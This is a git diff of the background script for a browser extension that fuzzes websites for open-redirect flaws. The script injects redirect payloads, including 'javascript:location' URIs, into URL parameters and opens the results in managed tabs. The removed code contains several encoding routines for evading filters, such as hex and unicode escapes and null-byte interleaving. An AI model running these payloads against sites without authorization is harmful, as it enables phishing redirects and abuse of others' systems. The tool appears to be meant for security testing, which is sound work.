@@ -2,60 +2,23 @@
  * Background script for fuzzer-open-redirect.
  */
 
-/* User configurable. */
+"use strict";
+
 let crawlerScripts = [];
 let delayForceWakeTabsThread = 2000;
-let delayRangeFuzzerThread = [20000, 40000];
-let delayRangeScannerThread = [20000, 40000];
-let delayRangePendingRetryURLsThread = [20000, 40000];
-let delayTabWatcherThread = 30000;
-let delayURLInjectionThread = 10000;
-let encodingTypes = [
-  [0],
-  [0,0],
-  [0,4],
-  [1],
-  [2],
-  [3],
-  [4],
-  [4,0],
-  [4,4],
-  [5],
-  [6],
-  [7],
-  [8],
-  [9],
-  [10],
-  [11],
-  [12],
-  [13],
-  [14],
-  [14,0],
-  [14,4],
-  [15],
-  [15,0],
-  [15,4],
-  [16],
-  [16,0],
-  [16,4],
-  [17],
-  [17,0],
-  [17,4],
-  [18],
-  [18,0],
-  [18,4],
-];
-let sessionID = "8230ufjio";
-let threadCountFuzzer = 2;
-let threadCountScanner = 2;
-let timeoutCallback = 20000;
-let timeoutCloseTabs = 20000;
-let timeoutRequests = 20000;
+let delayRangeFuzzerThread = [10000, 25000];
+let delayRangeRequests = [10000, 25000];
+let delayRangeScannerThread = [10000, 25000];
+let delayRangePendingRetryURLsThread = [10000, 20000];
+let delayTabCleanerThread = 60000;
+let threadCount = 2;
+let timeoutCallback = 40000;
+let timeoutRequests = 40000;
 let isFuzzerThreadPaused = false;
 let isScannerThreadPaused = false;
 let retryAttempts = 6;
+let statusCodesFail = ["4*", "5*"];
 
-const alphabeticalChars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
 const consoleCSS = "background-color:rgb(80,255,0);text-shadow:0 1px 1px rgba(0,0,0,.3);color:black";
 const redirectURLs = [
   "https://runescape.com",
@@ -78,30 +41,23 @@ const redirectURLs = [
   "javascript:location='https://runescape.com'",
   "javascript:location='//runescape.com'",
 ];
-const regexpSelectorPermuteURLParameter = new RegExp("=[^&]+", "ig");
-const regexpSelectorEscapableURICharacters = /[^A-Za-z0-9_.!~*'()-]/ig;
 
-let arrayPermutations = [];
 let callbackURLOpenRedirectTimestamps = "http://0.0.0.0:4242";
 let callbackURLRequestTimestamps = "http://0.0.0.0:4243";
-let chunkedFuzzerQueues = [];
-let chunkedScannerQueues = [];
-let exploitableURLs = [];
-let exploitableURLsBuffer = [];
-let fuzzerTabs = [];
-let fuzzerWindow;
-let injectedURLs = [];
+let injectedParameterURLsQueue = [];
+let injectedPathURLsQueue = [];
+let injectedRedirectParameterURLsQueue = [];
 let parsedCallbackURLOpenRedirectTimestamps = ["","","","","",""];
 let parsedCallbackURLRequestTimestamps = ["","","","","",""];
 let pendingRetryURLs = {};
 let pendingRetryCallbackURLs = {};
-let programs = [];
-let scannerTabs = [];
-let scannerWindow;
 let scannableURLs = [];
-let tabAnchorScanner;
-let tabAnchorFuzzer;
-let tabWatcherBuffer = [];
+let scannableURLsQueue = [];
+let tabAnchor;
+let tabIds = [];
+let tabCleanerBuffer = [];
+let windowId;
+let worker = new Worker(chrome.runtime.getURL("/assets/js/worker.js"));
 
 /**
  * Chunks a given array to a given length.
@@ -128,250 +84,6 @@ const chunkArrayWithChunkSize = (array, chunkSize) => {
 };
 
 /**
- * An integer mapped collection of methods to encode a given URI parameter string.
- */
-const encodeMethods = {
-  0: globalThis.encodeURIComponent,
-  1: str => {
-    /**
-     *  Returns a string exactly like globalThis.encodeURIComponent does, with lowercase hex
-     *  encoding.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (str.charAt(a).match(regexpSelectorEscapableURICharacters)) {
-        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  2: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 1) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https%3a%2f%2fmyredirectsite%2ecom%2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a) === -1)) {
-        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  3: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 1) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https%3A%2F%2Fmyredirectsite%2Ecom%2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a) === -1)) {
-        encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toUpperCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  4: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 2) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "%68%74%74%70%73%3a%2f%2f%6d%79%72%65%64%69%72%65%63%74%73%69%74%65%2e%63%6f%6d%2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toLowerCase();
-    }
-    return encodedBuffer.join("");
-  },
-  5: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 2) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "%68%74%74%70%73%3A%2F%2F%6D%79%72%65%64%69%72%65%63%74%73%69%74%65%2E%63%6F%6D%2F")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "%" + str.charCodeAt(a).toString(16).toUpperCase();
-    }
-    return encodedBuffer.join("");
-  },
-  6: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 3) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https\\u003a\\u002f\\u002fmyredirectsite\\u002ecom\\u002f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
-        encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toLowerCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  7: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 3) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https\\u003A\\u002F\\u002Fmyredirectsite\\u002Ecom\\u002f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
-        encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toUpperCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  8: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 4) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "\\u0068\\u0074\\u0074\\u0070\\u0073\\u003a\\u002f\\u002f\\u006d\\u0079\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u0073\\u0069\\u0074\\u0065\\u002e\\u0063\\u006f\\u006d\\u002f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toLowerCase();
-    }
-    return encodedBuffer.join("");
-  },
-  9: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 4) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "\\u0068\\u0074\\u0074\\u0070\\u0073\\u003A\\u002F\\u002F\\u006D\\u0079\\u0072\\u0065\\u0064\\u0069\\u0072\\u0065\\u0063\\u0074\\u0073\\u0069\\u0074\\u0065\\u002E\\u0063\\u006F\\u006D\\u002F")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "\\u00" + str.charCodeAt(a).toString(16).toUpperCase();
-    }
-    return encodedBuffer.join("");
-  },
-  10: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 5) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https\\x3a\\x2f\\x2fmyredirectsite\\x2ecom\\x2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
-        encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toLowerCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  11: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 5) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "https\\x3A\\x2F\\x2Fmyredirectsite\\x2Ecom\\x2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (alphabeticalChars.indexOf(str.charAt(a)) === -1) {
-        encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toUpperCase();
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  12: str => {
-    /**
-     * Returns a lowercase hex encoded string (type 6) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x6d\\x79\\x72\\x65\\x64\\x69\\x72\\x65\\x63\\x74\\x73\\x69\\x74\\x65\\x2e\\x63\\x6f\\x6d\\x2f")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toLowerCase();
-    }
-    return encodedBuffer.join("");
-  },
-  13: str => {
-    /**
-     * Returns an uppercase hex encoded string (type 6) using a given string.
-     * (example input: "https://myredirectsite.com/")
-     * (example output: "\\x68\\x74\\x74\\x70\\x73\\x3A\\x2F\\x2F\\x6D\\x79\\x72\\x65\\x64\\x69\\x72\\x65\\x63\\x74\\x73\\x69\\x74\\x65\\x2E\\x63\\x6F\\x6D\\x2F")
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = "\\x" + str.charCodeAt(a).toString(16).toUpperCase();
-    }
-    return encodedBuffer.join("");
-  },
-  14: str => {
-    /**
-     *  Replaces full stops with ideographic full stops.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      if (str.charAt(a) === ".") {
-        encodedBuffer[a] = "。";
-      } else {
-        encodedBuffer[a] = str.charAt(a);
-      }
-    }
-    return encodedBuffer.join("");
-  },
-  15: str => {
-    /**
-     *  Returns a given string with a null byte between each character.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = str.charAt(a);
-    }
-    return encodedBuffer.join("\x00");
-  },
-  16: str => {
-    /**
-     *  Returns a given string with a URL encoded null byte between each character.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = str.charAt(a);
-    }
-    return encodedBuffer.join("%00");
-  },
-  17: str => {
-    /**
-     *  Returns a given string with a hex encoded null byte (type 17) between each character.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = str.charAt(a);
-    }
-    return encodedBuffer.join("\\u0000");
-  },
-  18: str => {
-    /**
-     *  Returns a given string with a hex encoded null byte (type 18) between each character.
-     */
-    let encodedBuffer = new Array(str.length);
-    for (let a = 0; a < str.length; a++) {
-      encodedBuffer[a] = str.charAt(a);
-    }
-    return encodedBuffer.join("\\x00");
-  },
-};
-
-/**
  * Returns an array of all string values that were found in a given object.
  */
 const getAllStringValues = obj => {
@@ -387,59 +99,6 @@ const getAllStringValues = obj => {
 };
 
 /**
- * Appends all possible permutations of a given array to arrayPermutations.
- */
-const getArrayPermutations = (prefix, arr) => {
-  for (let a = 0; a < arr.length; a++) {
-    arrayPermutations.push(prefix.concat(arr[a]));
-    getArrayPermutations(prefix.concat(arr[a]), arr.slice(a + 1));
-  }
-};
-
-/**
- * Returns an array of all injected permutations of a given URL.
- * (example input: (
- *   "//www.google.com/q=http%3A%2F%2Fgmail%2Ecom%2F",
- *   %2F%2Fmysite%2Ecom%2F",
- * ))
- */
-const getInjectedURLPermutations = (targetURL, redirectURL) => {
-  const parsedURL = parseURL(targetURL);
-  if (parsedURL[4].length !== 0) {
-
-  }
-  let regexpMatches = [];
-  let match;
-  while (match = regexpSelectorPermuteURLParameter.exec(parsedURL[4])) {
-    regexpMatches.push({match: match[0], index: match.index});
-  }
-  getArrayPermutations([], regexpMatches);
-  let newInjectedURLs = [];
-  for (let a = 0; a < arrayPermutations.length; a++) {
-    let matchSets = arrayPermutations[a];
-    let injectedSearch = parsedURL[4];
-    for (let b = 0; b < matchSets.length; b++) {
-      const matchSet = matchSets[b];
-      const lengthLeadingMatches = matchSets.slice(0, b)
-        .map(set => { return set.match }).join("").length;
-      const search_ = injectedSearch.slice(
-        0,
-        matchSet.index
-          + (b * (redirectURL.length + 1))
-          - lengthLeadingMatches);
-      const _search = injectedSearch.slice(
-        matchSet.index
-          + ((b * (redirectURL.length + 1)) - lengthLeadingMatches)
-          + (matchSet.match.length));
-      injectedSearch = search_ + "=" + redirectURL + _search;
-    }
-    newInjectedURLs.push(parsedURL.slice(0, 4).join("") + injectedSearch + parsedURL[5]);
-  }
-  arrayPermutations = [];
-  return newInjectedURLs;
-};
-
-/**
  * Returns an integer value between a minimum and maximum range of milliseconds.
  */
 const getIntFromRange = (min, max) => {
@@ -447,23 +106,17 @@ const getIntFromRange = (min, max) => {
 };
 
 /**
- * Returns an array of URLs that are encoded as per the specified encodingTypes value.
+ * Returns true if a given status code string matches the specified fail status code
+ * specifiers.
  */
-const getURLVariants = url => {
-  if (url === "") {
-    console.error("Empty string parameter passed through getURLVariants().");
-    return [];
-  }
-  let URLVariants = [];
-  for (let a = 0; a < encodingTypes.length; a++) {
-    let URLVariant = url;
-    const encodingTypeSet = encodingTypes[a];
-    for (let b = 0; b < encodingTypeSet.length; b++) {
-      URLVariant = encodeMethods[encodingTypeSet[b]](URLVariant);
+const isFailStatusCode = statusCodeString => {
+  for (let a = 0; a < statusCodesFail.length; a++) {
+    const selector = "^" + statusCodesFail[a].replace(/[*]/g, "[0-9]+") + "$";
+    if (statusCodeString.match(new RegExp(selector))) {
+      return true;
     }
-    URLVariants.push(URLVariant);
   }
-  return URLVariants;
+  return false;
 };
 
 /**
@@ -473,33 +126,14 @@ const openURLInNewFuzzerTab = async url => {
   return new Promise((res, err) => {
     const date = new Date();
     const timestamp = date.toLocaleDateString() + " " +  date.toLocaleTimeString();
-    let callbackURL;
-    if (parsedCallbackURLRequestTimestamps[4] !== "") {
-      callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 5).join("") +
-        "&timestamp=" + encodeURIComponent(timestamp) +
-        "&url=" + encodeURIComponent(url) +
-        parsedCallbackURLRequestTimestamps[5];
-    } else {
-      callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 4).join("") +
-        "?timestamp=" + encodeURIComponent(timestamp) +
-        "&url=" + encodeURIComponent(url) +
-        parsedCallbackURLOpenRedirectTimestamps[5];
-    }
-    fetch(callbackURL).then(res => {
-      if (!res.ok) {
-        if (!pendingRetryCallbackURLs[callbackURL]) {
-          pendingRetryCallbackURLs[callbackURL] = {attempts: 0};
-        }
-      }
-    });
     chrome.tabs.create({
       url: url,
-      windowId: fuzzerWindow.id,
+      windowId: windowId
     }, tab => {
       setTimeout(() => {
         err("Opening tab timed out.");
       }, timeoutRequests);
-      fuzzerTabs.push({
+      tabIds.push({
         state: "loading",
         id: tab.id,
       });
@@ -512,19 +146,15 @@ const openURLInNewFuzzerTab = async url => {
 /**
  * Opens a given URL in a new scanner tab.
  */
-const openURLInNewScannerTab = async url => {
+const openURLInNewTab = async url => {
   return new Promise((res, err) => {
     setTimeout(() => {
       err("Opening tab timed out.");
     }, timeoutRequests);
     chrome.tabs.create({
       url: url,
-      windowId: scannerWindow.id,
+      windowId: windowId,
     }, tab => {
-      scannerTabs.push({
-        state: "loading",
-        id: tab.id,
-      });
       // execute crawlerScripts
       res(tab);
     });
@@ -534,37 +164,20 @@ const openURLInNewScannerTab = async url => {
 /**
  * Opens new windows for fuzzing and scanning.
  */
-const openFuzzerAndScannerWindows = async () => {
+const openWindow = async () => {
   return new Promise((res, err) => {
-    setTimeout(() => {
-      err("openFuzzerAndScannerWindows() timed out.")
-    }, timeoutRequests);
-    /* Open fuzzer window. */
     chrome.windows.create({
       url: "data:text/html,<title>about:black</title><body bgcolor=black>",
     }, w => {
       chrome.tabs.query({}, tabs => {
         tabs.forEach(tab => {
           if (tab.windowId === w.id) {
-            tabAnchorFuzzer = tab.id;
+            tabAnchor = tab.id;
           }
         });
       });
-      fuzzerWindow = w;
-      /* Open scanner window. */
-      chrome.windows.create({
-        url: "data:text/html,<title>about:black</title><body bgcolor=black>",
-      }, _w => {
-        chrome.tabs.query({}, tabs => {
-          tabs.forEach(tab => {
-            if (tab.windowId === _w.id) {
-              tabAnchorScanner = tab.id;
-            }
-          });
-        });
-        scannerWindow = _w;
-        res();
-      });
+      windowId = w.id;
+      res();
     });
   });
 };
@@ -653,82 +266,51 @@ const parseURL = url => {
 const registerMessageListener = () => {
   chrome.runtime.onMessage.addListener(async (message, sender) => {
     if (
-         message.sessionID
-      && message.sessionID === sessionID
+         message.injectableParameterURLs
+      || message.scannableURLs
     ) {
-      if (message.timestamp) {
-        console.log("Open redirect found at ", message.timestamp);
-        let callbackURL;
-        if (parsedCallbackURLOpenRedirectTimestamps[4] !== "") {
-          callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 5).join("") +
-            "&timestamp=" + encodeURIComponent(message.timestamp) +
-            parsedCallbackURLOpenRedirectTimestamps[5];
-        } else {
-          callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 4).join("") +
-            "?timestamp=" + encodeURIComponent(message.timestamp) +
-            parsedCallbackURLOpenRedirectTimestamps[5];
-        }
-        fetch(callbackURL).then(res => {
-          if (!res.ok) {
-            if (!pendingRetryCallbackURLs[callbackURL]) {
-              pendingRetryCallbackURLs[callbackURL] = {attempts: 0};
-            }
-          }
+      worker.postMessage(message);
+    }
+    if (message.timestamp) {
+      console.log("Open redirect found at ", message.timestamp);
+      sendCallback(message.timestamp, "OPEN_REDIRECT_CALLBACK");
+    }
+    if (message.message) {
+      if (
+           message.message === "CALLBACK_FRAME_READYSTATE_COMPLETE"
+        || message.message === "FRAME_READYSTATE_COMPLETE"
+      ) {
+        removeTab(sender.tab.id);
+        tabIds = tabIds.filter(tab => {
+          return tab.id !== sender.tab.id;
         });
-      }
-      if (message.message) {
-        if (
-             message.message === "CALLBACK_FRAME_READYSTATE_COMPLETE"
-          || message.message === "FRAME_READYSTATE_COMPLETE"
-        ) {
-          removeTab(sender.tab.id);
-          fuzzerTabs = fuzzerTabs.filter(tab => {
-            return tab.id !== sender.tab.id;
-          });
-          scannerTabs = scannerTabs.filter(tab => {
-            return tab.id !== sender.tab.id;
-          });
-        }
-      }
-      if (
-           message.exploitableURLs
-        && message.exploitableURLs.length !== 0
-      ) {
-        (async () => {
-          const filteredURLs = message.exploitableURLs.filter(url => {
-            return exploitableURLsBuffer.indexOf(url) === -1;
-          });
-          exploitableURLsBuffer = exploitableURLsBuffer.concat(filteredURLs);
-        })();
-      }
-      if (
-           message.scannableURLs
-        && message.scannableURLs.length !== 0
-      ) {
-        (async () => {
-          const chunkedScannableURLs = chunkArrayWithChunkSize(scannableURLs, 200);
-          const filteredURLs = message.scannableURLs.filter(url => {
-            for (let a = 0; a < chunkedScannableURLs.length; a++) {
-              const scannableURLsChunk = chunkedScannableURLs[a];
-              for (let b = 0; b < scannableURLsChunk.length; b++) {
-                if (scannableURLsChunk[b] === url) {
-                  return false;
-                }
-              }
-            }
-            return true;
-          });
-          scannableURLs = scannableURLs.concat(filteredURLs);
-          const chunkedURLs = chunkArrayToAmountOfChunks(
-            filteredURLs,
-            threadCountScanner);
-          for (let a = 0; a < chunkedURLs.length; a++) {
-            chunkedScannerQueues[a] = chunkedScannerQueues[a].concat(chunkedURLs[a]);
-          }
-        })();
       }
     }
   });
+  worker.onmessage = message => {
+//    if (message.data.retryCallbackURL) {
+//      if (pendingRetryCallbackURLs) {
+//      }
+//    }
+    if (message.data.appendage) {
+      if (message.data.appendage.injectedParameterURLsQueue) {
+        injectedParameterURLsQueue = injectedParameterURLsQueue.concat(
+          message.data.appendage.injectedParameterURLsQueue);
+      }
+      if (message.data.appendage.injectedPathURLsQueue) {
+        injectedPathURLsQueue = injectedPathURLsQueue.concat(
+          message.data.appendage.injectedPathURLsQueue);
+      }
+      if (message.data.appendage.injectedRedirectParameterURLsQueue) {
+        injectedRedirectParameterURLsQueue = injectedRedirectParameterURLsQueue.concat(
+          message.data.appendage.injectedRedirectParameterURLsQueue);
+      }
+      if (message.data.appendage.scannableURLsQueue) {
+        scannableURLsQueue = scannableURLsQueue.concat(
+          message.data.appendage.scannableURLsQueue);
+      }
+    }
+  };
 };
 
 /**
@@ -740,10 +322,7 @@ const registerWebRequestListeners = () => {
       if (details.type === "main_frame") {
         chrome.tabs.get(details.tabId, tab => {
           if (!chrome.runtime.lastError && tab) {
-            if (
-                 tab.windowId === fuzzerWindow.id
-              || tab.windowId === scannerWindow.id
-            ) {
+            if (tab.windowId === windowId) {
               removeTab(details.tabId);
               if (!pendingRetryURLs[details.url]) {
                 pendingRetryURLs[details.url] = {attempts: 0};
@@ -754,17 +333,17 @@ const registerWebRequestListeners = () => {
       }
     },
     {"urls": ["<all_urls>"]},
-    [],
-  );
-//  chrome.webRequest.onHeadersReceived.addListener(
-//    details => {
-//      if (visitedURLs.indexOf(details.url) === -1) {
-//        visitedURLs.push(details.url);
-//      }
-//    },
-//    {"urls": ["<all_urls>"]},
-//    ["blocking", "extraHeaders", "responseHeaders"]
-//  );
+    []);
+  chrome.webRequest.onHeadersReceived.addListener(
+    details => {
+      if (isFailStatusCode(details.statusCode.toString())) {
+        if (!pendingRetryURLs[details.url]) {
+          pendingRetryURLs[details.url] = {attempts: 0};
+        }
+      }
+    },
+    {"urls": ["<all_urls>"]},
+    []);
 };
 
 /**
@@ -774,10 +353,7 @@ const removeTab = async id => {
   return new Promise(res => {
     chrome.tabs.get(id, tab => {
       if (!chrome.runtime.lastError && tab) {
-        if (
-             tab.windowId === fuzzerWindow.id
-          || tab.windowId === scannerWindow.id
-        ) {
+        if (tab.windowId === windowId) {
           chrome.tabs.remove(id);
           res();
         }
@@ -787,35 +363,64 @@ const removeTab = async id => {
 };
 
 /**
- * Sleeps an awaited promise value for the given amount of milliseconds.
+ *
  */
-const sleep = ms => {
-  return new Promise(res=>{
-    setTimeout(res, ms);
+const sendCallback = async (timestamp, callbackType) => {
+  return new Promise((res, err) => {
+    let callbackURL = "";
+    if (callbackType === "REQUEST_CALLBACK") {
+      if (parsedCallbackURLRequestTimestamps[4] !== "") {
+        callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 5).join("") +
+          "&timestamp=" + encodeURIComponent(timestamp) +
+          "&url=" + encodeURIComponent(url) +
+          parsedCallbackURLRequestTimestamps[5];
+      } else {
+        callbackURL = parsedCallbackURLRequestTimestamps.slice(0, 4).join("") +
+          "?timestamp=" + encodeURIComponent(timestamp) +
+          "&url=" + encodeURIComponent(url) +
+          parsedCallbackURLOpenRedirectTimestamps[5];
+      }
+    } else if (callbackType === "OPEN_REDIRECT_CALLBACK") {
+      if (parsedCallbackURLOpenRedirectTimestamps[4] !== "") {
+        callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 5).join("") +
+          "&timestamp=" + encodeURIComponent(timestamp) +
+          "&url=" + encodeURIComponent(url) +
+          parsedCallbackURLOpenRedirectTimestamps[5];
+      } else {
+        callbackURL = parsedCallbackURLOpenRedirectTimestamps.slice(0, 4).join("") +
+          "?timestamp=" + encodeURIComponent(timestamp) +
+          "&url=" + encodeURIComponent(url) +
+          parsedCallbackURLOpenRedirectTimestamps[5];
+      }
+    }
+    if (callbackURL.length !== 0) {
+      fetch(callbackURL).then(res => {
+        if (!res.ok) {
+          if (!pendingRetryCallbackURLs[callbackURL]) {
+            pendingRetryCallbackURLs[callbackURL] = {attempts: 0};
+          }
+        }
+        res();
+      }).catch(_err => {
+        err(_err);
+      });
+    } else {
+      err("Unable to create callback URL, " + "\n" +
+        "timestamp: " + timestamp + "\n" +
+        "callback type: " + callbackType + "\n" +
+        "callback URLs: " + callbackURLRequestTimestamps +
+          ", " + callbackURLOpenRedirectTimestamps);
+    }
   });
 };
 
 /**
- * Starts fuzzing an indefinite amount of potentially vulnerable URLs that are in scope.
+ * Sleeps an awaited promise value for the given amount of milliseconds.
  */
-const startFuzzerThread = async () => {
-  while (injectedURLs.length === 0) {
-    await sleep(1000);
-  }
-  for (let a = 0; a < chunkedFuzzerQueues.length; a++) {
-    (async () => {
-      while (true) {
-        const URL = chunkedFuzzerQueues[a][0];
-        if (URL && URL !== "") {
-          chunkedFuzzerQueues[a] = chunkedFuzzerQueues[a].slice(1);
-          openURLInNewFuzzerTab(URL);
-        }
-        await sleep(getIntFromRange(
-          delayRangeFuzzerThread[0],
-          delayRangeFuzzerThread[1]));
-      }
-    })();
-  }
+const sleep = ms => {
+  return new Promise(res => {
+    setTimeout(res, ms);
+  });
 };
 
 /**
@@ -823,33 +428,17 @@ const startFuzzerThread = async () => {
  */
 const startForceWakeTabsThread = async () => {
   while (true) {
-    if (fuzzerTabs.length === 0 && scannerTabs.length === 0) {
+    if (tabIds.length === 0) {
       await sleep(delayForceWakeTabsThread);
     }
-    for (let a = 0; a < fuzzerTabs.length; a++) {
-      chrome.tabs.get(fuzzerTabs[a].id, tab => {
+    for (let a = 0; a < tabIds.length; a++) {
+      chrome.tabs.get(tabIds[a].id, tab => {
         if (!chrome.runtime.lastError && tab) {
           chrome.tabs.update(tab.id, {
             active: true,
             selected: true,
           }, () => {
-            chrome.tabs.update(tabAnchorFuzzer, {
-              active: true,
-              selected: true,
-            });
-          });
-        }
-      });
-      await sleep(delayForceWakeTabsThread);
-    }
-    for (let a = 0; a < scannerTabs.length; a++) {
-      chrome.tabs.get(scannerTabs[a].id, tab => {
-        if (!chrome.runtime.lastError && tab) {
-          chrome.tabs.update(tab.id, {
-            active: true,
-            selected: true,
-          }, () => {
-            chrome.tabs.update(tabAnchorScanner, {
+            chrome.tabs.update(tabAnchor, {
               active: true,
               selected: true,
             });
@@ -885,14 +474,38 @@ const startPendingRetryURLsThread = async () => {
 /**
  * Starts scanning an indefinite amount of URLs that are in scope.
  */
-const startScannerThread = async () => {
-  for (let a = 0; a < chunkedScannerQueues.length; a++) {
+const startRequestThread = async () => {
+  for (let a = 0; a < threadCount; a++) {
     (async () => {
       while (true) {
-        const URL = chunkedScannerQueues[a][0];
-        if (URL && URL !== "") {
-          chunkedScannerQueues[a] = chunkedScannerQueues[a].slice(1);
-          openURLInNewScannerTab(URL);
+        let URL = "";
+        if (injectedRedirectParameterURLsQueue.length !== 0) {
+          URL = injectedRedirectParameterURLsQueue[0];
+          injectedRedirectParameterURLsQueue = injectedRedirectParameterURLsQueue.slice(1);
+        }
+        if (
+             URL.length === 0
+          && injectedPathURLsQueue.length !== 0
+        ) {
+          URL = injectedPathURLsQueue[0];
+          injectedPathURLsQueue = injectedPathURLsQueue.slice(1);
+        }
+        if (
+             URL.length === 0
+          && injectedParameterURLsQueue.length !== 0
+        ) {
+          URL = injectedParameterURLsQueue[0];
+          injectedParameterURLsQueue = injectedParameterURLsQueue.slice(1);
+        }
+        if (
+             URL.length === 0
+          && scannableURLsQueue.length !== 0
+        ) {
+          URL = scannableURLsQueue[0];
+          scannableURLsQueue = scannableURLsQueue.slice(1);
+        }
+        if (URL.length !== 0) {
+          openURLInNewTab(URL);
         }
         await sleep(getIntFromRange(
           delayRangeScannerThread[0],
@@ -903,92 +516,28 @@ const startScannerThread = async () => {
 };
 
 /**
- * Starts looking for idle tabs in fuzzer/scanner window and removes them.
+ * Starts looking for idle tabs and removes them.
  */
-const startTabWatcherThread = async () => {
+const startTabCleanerThread = async () => {
   while (true) {
     chrome.tabs.query({}, tabs => {
       tabs.forEach(tab => {
         if (
-             tab.id !== tabAnchorFuzzer
-          && tab.id !== tabAnchorScanner
-          && (
-               tab.windowId === fuzzerWindow.id
-            || tab.windowId === scannerWindow.id)
+             tab.windowId === windowId
+          && tab.id !== tabAnchor
         ) {
-          if (tabWatcherBuffer.indexOf(tab.id) === -1) {
-            tabWatcherBuffer.push(tab.id);
+          if (tabCleanerBuffer.indexOf(tab.id) === -1) {
+            tabCleanerBuffer.push(tab.id);
           } else {
             removeTab(tab.id);
-            tabWatcherBuffer = tabWatcherBuffer.filter(id => {
+            tabCleanerBuffer = tabCleanerBuffer.filter(id => {
               return id !== tab.id;
             });
           }
         }
       });
     });
-    await sleep(delayTabWatcherThread);
-  }
-};
-
-/**
- * Starts creating injected permutations of an indefinite amount of exploitable URLs.
- */
-const startURLInjectionThread = async () => {
-  while (exploitableURLsBuffer.length === 0) {
-    await sleep(1000);
-  }
-  while (true) {
-    while (chunkedFuzzerQueues[0].length > 1000) {
-      await sleep(1000);
-    }
-    if (exploitableURLsBuffer.length !== 0) {
-      let newInjectedURLs = [];
